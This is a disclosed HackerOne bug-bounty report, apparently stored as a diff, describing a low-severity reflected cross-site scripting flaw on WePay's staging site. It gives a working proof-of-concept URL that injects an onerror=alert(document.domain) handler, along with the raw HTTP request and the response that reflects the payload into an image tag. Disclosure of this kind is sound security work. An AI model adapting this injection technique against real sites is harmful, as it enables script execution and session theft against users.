@@ -1,0 +1,28 @@
+ReportLink:https://hackerone.com/reports/281038
+WeaknessName:Cross-site Scripting (XSS) - Reflected
+Reporter:https://hackerone.com/bobrov
+ReportedTo:WePay(wepay)
+BountyAmount:100.0
+Severity:low
+State:Closed
+DateOfDisclosure:18.11.2018 7:14:07
+
+Summary:
+
+**PoC**
+Open URL in Internet Explorer.
+This vulnerability only works in Internet Explorer (and possibly in Edge), since it is necessary to send a Request-URI without a URL Encode, which is only possible in this browser via redirect.
+```
+https://blackfan.ru/x?r=https://stage-go.wepay.com/%22onerror=%22alert(document.domain)%22/%252e%252e/index.php/%22/index.php
+```
+
+**HTTP Request**
+```http
+GET /"onerror="alert(document.domain)"/%2e%2e/index.php/"/index.php HTTP/1.1
+Host: stage-go.wepay.com
+```
+
+**HTTP Response**
+```html
+<img src="https://stage-go.wepay.com/"onerror="alert(document.domain)"/%2e%2e/index.php/"/index.php/uploads/847_WePay_20170809-700.png" alt="Mans" class="hero--image"> 
+```
